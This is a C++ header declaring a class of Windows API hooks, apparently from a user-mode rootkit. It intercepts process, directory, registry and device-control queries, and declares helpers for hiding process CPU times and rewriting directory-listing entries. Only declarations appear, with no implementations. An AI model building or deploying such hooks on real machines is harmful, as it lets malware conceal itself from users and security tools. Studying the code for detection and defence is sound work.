/// <summary>
/// Implementation of hooked functions.
/// </summary>
class Hooks
{
private:
	static bool IsInitialized;

	static nt::NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
	static nt::NTRESUMETHREAD OriginalNtResumeThread;
	static nt::NTQUERYDIRECTORYFILE OriginalNtQueryDirectoryFile;
	static nt::NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
	static nt::NTENUMERATEKEY OriginalNtEnumerateKey;
	static nt::NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
	static nt::NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;

	static void InstallHook(LPCSTR dll, LPCSTR function, LPVOID *originalFunction, LPVOID hookedFunction);
	static void UninstallHook(LPVOID originalFunction, LPVOID hookedFunction);

	static NTSTATUS NTAPI HookedNtQuerySystemInformation(nt::SYSTEM_INFORMATION_CLASS systemInformationClass, LPVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);
	static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount);
	static NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, nt::FILE_INFORMATION_CLASS fileInformationClass, BOOLEAN returnSingleEntry, PUNICODE_STRING fileName, BOOLEAN restartScan);
	static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, LPVOID fileInformation, ULONG length, nt::FILE_INFORMATION_CLASS fileInformationClass, ULONG queryFlags, PUNICODE_STRING fileName);
	static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, nt::KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength);
	static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, nt::KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength);
	static NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength);

	static bool GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime);
	static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName);
	static LPWSTR FileInformationGetName(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name);
	static ULONG FileInformationGetNextEntryOffset(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass);
	static void FileInformationSetNextEntryOffset(LPVOID fileInformation, nt::FILE_INFORMATION_CLASS fileInformationClass, ULONG value);
	static PWCHAR KeyInformationGetName(LPVOID keyInformation, nt::KEY_INFORMATION_CLASS keyInformationClass);
	static PWCHAR KeyValueInformationGetName(LPVOID keyValueInformation, nt::KEY_VALUE_INFORMATION_CLASS keyValueInformationClass);
public:
	/// <summary>
	/// Installs hooks.
	/// </summary>
	static void Initialize();
	/// <summary>
	/// Unhooks functions.
	/// </summary>
	static void Shutdown();
};